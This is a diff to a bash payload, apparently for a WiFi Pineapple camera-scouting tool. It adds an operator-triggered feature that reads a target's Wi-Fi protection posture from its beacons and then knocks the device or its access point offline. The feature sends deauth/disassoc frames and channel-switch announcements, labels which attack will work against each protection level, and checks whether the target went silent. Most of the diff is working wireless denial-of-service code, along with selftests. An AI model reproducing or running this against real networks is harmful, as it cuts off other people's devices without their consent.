@@ -5,7 +5,11 @@
 #              a 0-100 confidence scale, and (on request) locks on one suspect to test whether it
 #              is streaming (Watch), whether it reacts to movement (Stimulus test) or where it is
 #              (Locate). Identity scan is passive and free; Watch/Locate pause Recon hopping for
-#              the duration of the lock. No LAN join, no transmit, no deauth.
+#              the duration of the lock. No LAN join. With RESPONSE=1 a fourth rung appears on the
+#              device card: read the target's PMF/beacon-protection posture from its own beacon,
+#              then disconnect it with deauth+disassoc, channel-switch announcements, or all three,
+#              and judge from Recon whether it actually went quiet. RESPONSE defaults to 0, in
+#              which case nothing is transmitted and the device card is unchanged.
 # Author: tsuinami-1112
 # Version: 1.0
 # Category: reconnaissance
@@ -24,6 +28,9 @@
 # CYAN VERYFAST      - Watch running (Recon hopping paused by the EXAMINE lock)
 # R SOLID            - Watch reached STREAM or EVENT (+ one long vibe)
 # B/C/Y/R SOLID      - Locate tiers cold/warm/strong/hot (click per sample, vibe at hot)
+# MAGENTA            - response transmitting (channel locked for the burst)
+# GREEN              - response MOVED: the target stopped transmitting (+ one long vibe)
+# YELLOW             - response NO_EFFECT or INCONCLUSIVE
 # FAIL               - preflight failure (no _pineap or no vendor table) then exit
 # FINISH, then OFF   - clean exit
 # States persist until the next cycle restores CYAN SLOW; set_state() never sleeps.
@@ -85,6 +92,8 @@ SCAN_IF="wlan0"         # posture cross-check iface: the enabled dummy sta on ra
 BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
 BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one is parsed)
 POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
+RESP_LOCK_SECS=20       # EXAMINE lock duration held across a response
+RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
 LOOT_DIR="/root/loot/CamScout"
 OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
 # identity weights (constants, not table columns)
@@ -137,6 +146,9 @@ set_state() {
     LOC2)         LED C SOLID ;;
     LOC3)         LED Y SOLID ;;
     LOC4)         LED R SOLID; VIBRATE 50 ;;
+    RESPOND)      LED MAGENTA ;;
+    RESPOND_HIT)  LED GREEN; VIBRATE 300 ;;
+    RESPOND_NIL)  LED YELLOW; VIBRATE 100 ;;
     FAIL)         LED FAIL; VIBRATE 500 ;;
     FINISH)       LED FINISH; LED OFF ;;
     OFF)          LED OFF ;;
@@ -1102,8 +1114,151 @@ tag_lines() {   # tag_lines mac -> TAGTXT (one meaning per tag, max 3)
 }
 TAGTXT=""
 
+# --- response rung begin ---
+# Operator-driven disconnect. Nothing transmits unless RESPONSE=1 AND the operator picks an attack
+# from the device card; there is no automatic path from a detection to the air.
+RESP_HDR='#epoch|mac|role|bssid|target|ch|band|badge|rsn_caps|beacon_prot|attack|cmd|lock|pk_before|pk_after|verdict'
+R_BSSID=""; R_TARGET=""; R_CH=0; R_BAND='?'
+
+resp_target() {   # resp_target <mac> -> sets R_BSSID R_TARGET R_CH R_BAND; rc 1 when unattackable
+  local mac="$1" ap
+  R_BSSID=""; R_TARGET=""; R_CH="${CH[$mac]:-0}"; R_BAND="${BAND[$mac]:-?}"
+  if [ "${ROLE[$mac]}" = cli ]; then
+    ap="${AP_OF[$mac]:--}"
+    [ "$ap" = - ] || [ -z "$ap" ] && return 1      # unassociated: no BSS to announce from
+    R_BSSID="$ap"; R_TARGET="$mac"
+    [ -n "${CH[$ap]}" ] && [ "${CH[$ap]}" != - ] && R_CH="${CH[$ap]}"   # a client rides its AP's channel
+    [ -n "${BAND[$ap]}" ] && R_BAND="${BAND[$ap]}"
+  else
+    R_BSSID="$mac"; R_TARGET="ff:ff:ff:ff:ff:ff"
+  fi
+  [[ $R_CH =~ ^[0-9]+$ ]] || return 1
+  (( R_CH > 0 )) || return 1
+  return 0
+}
+
+recon_stat() {   # recon_stat <mac> -> "packets last_seen", rc 1 when recon has no such row
+  local mac="${1,,}" m a pk sig pr fr t ch ssid hid
+  while IFS='|' read -r m a pk sig pr fr t ch; do
+    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
+  done < <(recon_lines CLIENTS)
+  while IFS='|' read -r m pk ssid ch fr sig hid t; do
+    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
+  done < <(recon_lines APS)
+  return 1
+}
+
+# resp_verdict <pk0> <t0> <pk1> <t1> <present_after> -> MOVED | NO_EFFECT | INCONCLUSIVE
+# Every kernel-side drop path reports success, so "we sent it" proves nothing. Only the target's
+# own behaviour afterwards does, and a stalled packet counter is the strongest signal recon gives.
+resp_verdict() {
+  local p0="$1" t0="$2" p1="$3" t1="$4" present="$5"
+  [ "$present" = 0 ] && { printf 'MOVED'; return 0; }           # dropped out of recon entirely
+  [ -z "$p0" ] || [ "$p0" = - ] && { printf 'INCONCLUSIVE'; return 0; }
+  [ -z "$p1" ] || [ "$p1" = - ] && { printf 'INCONCLUSIVE'; return 0; }
+  [[ $p0 =~ ^[0-9]+$ && $p1 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }
+  (( p1 > p0 )) && { printf 'NO_EFFECT'; return 0; }            # still transmitting
+  [ "$t1" = "$t0" ] && { printf 'MOVED'; return 0; }            # counter stalled, nothing newer seen
+  printf 'INCONCLUSIVE'
+}
+
+resp_write() {   # resp_write <mac> <badge> <attack> <cmd> <lock> <pk0> <pk1> <verdict>
+  local f="$LOOT_DIR/responses.tsv" bp=-
+  [ "$POSTURE_EXT" = - ] || bp=$(hex_octet "$POSTURE_EXT" 10 2>/dev/null) || bp=-
+  [ -s "$f" ] || printf '%s\n' "$RESP_HDR" >"$f" 2>/dev/null
+  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
+    "$EPOCHSECONDS" "$1" "${ROLE[$1]:--}" "$R_BSSID" "$R_TARGET" "$R_CH" "$R_BAND" \
+    "$2" "${POSTURE_RSN:--}" "$bp" "$3" "$4" "$5" "$6" "$7" "$8" >>"$f" 2>/dev/null
+}
+
+resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
+  local mac="$1" k="$2" badge="$3" cmd lock rc s p0=- t0=- p1=- t1=- present=1 verdict
+  cmd=$(response_cmd "$k")
+  [ -n "$cmd" ] || return 1
+  if ! command -v "$cmd" >/dev/null 2>&1; then
+    LOG red "$cmd not present in this firmware"; log resp "missing $cmd"; return 1
+  fi
+  if s=$(recon_stat "$R_TARGET"); then read -r p0 t0 <<<"$s"; fi
+  lock_target "$R_BSSID" "$RESP_LOCK_SECS"; rc=$?
+  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; *) lock=failed ;; esac
+  if (( rc == 2 )); then
+    unlock_target
+    LOG red "lock failed: $LOCK_TEXT"; log resp "lock-failed $R_BSSID $LOCK_TEXT"
+    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" - LOCK_FAILED
+    set_state INCONCLUSIVE; return 1
+  fi
+  set_state RESPOND
+  LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock"
+  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock"
+  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
+  else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>&1; fi
+  sleep "$RESP_SETTLE_SECS"
+  if s=$(recon_stat "$R_TARGET"); then read -r p1 t1 <<<"$s"; else present=0; fi
+  unlock_target
+  verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
+  resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict"
+  log resp "verdict $verdict $R_TARGET pk $p0 -> $p1 present=$present"
+  case "$verdict" in
+    MOVED)     set_state RESPOND_HIT; LOG green "$verdict: target went quiet" ;;
+    NO_EFFECT) set_state RESPOND_NIL; LOG yellow "$verdict: still transmitting (pk $p0 -> $p1)" ;;
+    *)         set_state INCONCLUSIVE; LOG yellow "$verdict: recon could not settle it" ;;
+  esac
+  return 0
+}
+
+disrupt_row() {   # a cached badge is free to show; an uncached one is not worth a capture to render
+  local mac="$1" ap bss
+  [ "${ROLE[$mac]}" = cli ] && bss="${AP_OF[$mac]:--}" || bss="$mac"
+  if [ -n "${POSTURE[$bss]}" ] && (( EPOCHSECONDS - ${POSTURE_TS[$bss]:-0} < POSTURE_TTL )); then
+    printf 'Disrupt [%s]' "${POSTURE[$bss]}"
+  else
+    printf 'Disrupt'
+  fi
+}
+
+disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon says will work
+  local mac="$1" badge opts k exp items=() pickmap=() i=0 choice
+  if ! resp_target "$mac"; then
+    LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
+  fi
+  LOG "reading posture ${R_BSSID:9} ch $R_CH"
+  badge=$(posture_of "$R_BSSID" "$R_BAND" "$R_CH")
+  opts=$(posture_opts "$badge")
+  LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
+  if [ -z "$opts" ]; then
+    LOG red "$(posture_why "$badge")"
+    confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
+    opts='BOTH DEAUTH CSA'
+  fi
+  for k in $opts; do
+    exp=$(posture_expect "$badge" "$k")
+    items+=("$(printf '%s (%s)' "$k" "$exp")"); pickmap+=("$k"); i=$((i + 1))
+  done
+  pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
+  [ "$PICK" = Back ] && return 0
+  choice=""
+  for ((i = 0; i < ${#items[@]}; i++)); do [ "$PICK" = "${items[$i]}" ] && choice="${pickmap[$i]}"; done
+  [ -n "$choice" ] || return 0
+  if [ "$RESPONSE_CONFIRM" = 1 ]; then
+    confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
+  fi
+  resp_fire "$mac" "$choice" "$badge"
+}
+
+posture_why() {   # one line of plain English for a badge
+  case "$1" in
+    'D+C')   printf 'no PMF: deauth and CSA both land' ;;
+    'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
+    'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
+    'NONE')  printf 'PMF + beacon protection: nothing here works' ;;
+    'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
+    *)       printf 'posture unread: no beacon captured' ;;
+  esac
+}
+# --- response rung end ---
+
 detail_card() {
-  local mac="$1" def="${2:-}" age wrow
+  local mac="$1" def="${2:-}" age wrow drow
   [ -n "$mac" ] || return 0
   while :; do
     age=$(( EPOCHSECONDS - ${LAST_SEEN[$mac]:-$EPOCHSECONDS} ))
@@ -1111,8 +1266,10 @@ detail_card() {
     LOG "[$MODE] ${CONF[$mac]} ${BANDNAME[$mac]} ${ROLE[$mac]} $mac"$'\n'"cat: ${CAT[$mac]} ${VENDOR[$mac]:--}"$'\n'"ssid: ${SSID_CLEAN[$mac]:--} ch${CH[$mac]:-?} ${BAND[$mac]:-?}GHz"$'\n'"rssi ${RSSI_LAST[$mac]:--} best ${RSSI_BEST[$mac]:--} ${PROX[$mac]:-?} ${age}s ago"$'\n'"${TAGTXT%$'\n'}"
     if watchable "$mac"; then wrow="Watch"; elif [ "$HAVE_TCPDUMP" != 1 ]; then wrow="Watch (no tcpdump)"; else wrow="Watch n/a (not associated)"; fi
     [ "$def" = watch ] && def="$wrow" || def="Back"
-    pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" "Locate" "Ignore for session" "Back" || return 0
+    drow=""; [ "$RESPONSE" = 1 ] && drow=$(disrupt_row "$mac")
+    pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" ${drow:+"$drow"} "Locate" "Ignore for session" "Back" || return 0
     case "$PICK" in
+      "Disrupt"*) disrupt_menu "$mac" ;;
       "Watch") watch_menu "$mac" ;;
       "Watch n/a"*) LOG "probe-only: identity + Locate only; Locate updates on probe bursts (15-60 s) and the MAC may rotate" ;;
       "Watch (no tcpdump)") LOG "tcpdump missing: opkg update; opkg install tcpdump" ;;
@@ -1751,6 +1908,41 @@ selftest() {
   st "beacon: bad magic rejected" "$?" 1
   st_pcap "$tmp/b_data.pcap" 1200 4 1700000000; beacon_find "$tmp/b_data.pcap" >/dev/null 2>&1
   st "beacon: no beacon in file rc" "$?" 1
+  # 7d response rung: target resolution, effect verdicts, loot row
+  st_device aa:00:00:00:00:10 ap "Reolink" "cam-ap" 0 -
+  CH[aa:00:00:00:00:10]=6; BAND[aa:00:00:00:00:10]=2
+  resp_target aa:00:00:00:00:10
+  st "resp_target ap targets broadcast" "$R_TARGET" "ff:ff:ff:ff:ff:ff"
+  st "resp_target ap is its own bssid"  "$R_BSSID"  "aa:00:00:00:00:10"
+  st "resp_target ap channel"           "$R_CH"     "6"
+  st_device aa:00:00:00:00:11 cli "Wyze" "" 0 aa:00:00:00:00:10
+  CH[aa:00:00:00:00:11]=0
+  resp_target aa:00:00:00:00:11
+  st "resp_target cli uses ap bssid"    "$R_BSSID"  "aa:00:00:00:00:10"
+  st "resp_target cli targets itself"   "$R_TARGET" "aa:00:00:00:00:11"
+  st "resp_target cli rides ap channel" "$R_CH"     "6"
+  st_device aa:00:00:00:00:12 cli "Espressif" "" 0 -
+  resp_target aa:00:00:00:00:12 >/dev/null 2>&1; st "resp_target unassociated rc" "$?" 1
+  st_device aa:00:00:00:00:13 ap "Hikvision" "x" 0 -
+  CH[aa:00:00:00:00:13]=0
+  resp_target aa:00:00:00:00:13 >/dev/null 2>&1; st "resp_target no channel rc" "$?" 1
+  st "verdict target vanished"  "$(resp_verdict 100 50 - - 0)"     "MOVED"
+  st "verdict counter advanced" "$(resp_verdict 100 50 140 60 1)"  "NO_EFFECT"
+  st "verdict counter stalled"  "$(resp_verdict 100 50 100 50 1)"  "MOVED"
+  st "verdict stalled but seen" "$(resp_verdict 100 50 100 60 1)"  "INCONCLUSIVE"
+  st "verdict no baseline"      "$(resp_verdict - - 140 60 1)"     "INCONCLUSIVE"
+  st "verdict no follow-up"     "$(resp_verdict 100 50 - - 1)"     "INCONCLUSIVE"
+  st "verdict non-numeric"      "$(resp_verdict x 50 y 60 1)"      "INCONCLUSIVE"
+  POSTURE[aa:00:00:00:00:10]=C; POSTURE_TS[aa:00:00:00:00:10]=$EPOCHSECONDS
+  st "disrupt row shows cached badge" "$(disrupt_row aa:00:00:00:00:10)" "Disrupt [C]"
+  st "disrupt row bare when uncached" "$(disrupt_row aa:00:00:00:00:13)" "Disrupt"
+  R_BSSID=aa:00:00:00:00:10; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
+  POSTURE_RSN=cc00; POSTURE_EXT=-; rm -f "$tmp/responses.tsv"
+  resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED
+  st "response header written"           "$(head -1 "$tmp/responses.tsv")" "$RESP_HDR"
+  st "response row field count = header" "$(sed -n 2p "$tmp/responses.tsv" | awk -F'|' '{print NF}')" \
+                                         "$(printf '%s\n' "$RESP_HDR" | awk -F'|' '{print NF}')"
+  st "posture_why covers NOINJ" "$(posture_why NOINJ | grep -c 'may not transmit')" "1"
   # 8 marked blocks
   if command -v md5sum >/dev/null 2>&1 && [ -f "${BASH_SOURCE[0]}" ]; then
     printf 'lib block md5   %s\n' "$(sed -n '/^# --- camscout lib begin ---/,/^# --- camscout lib end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
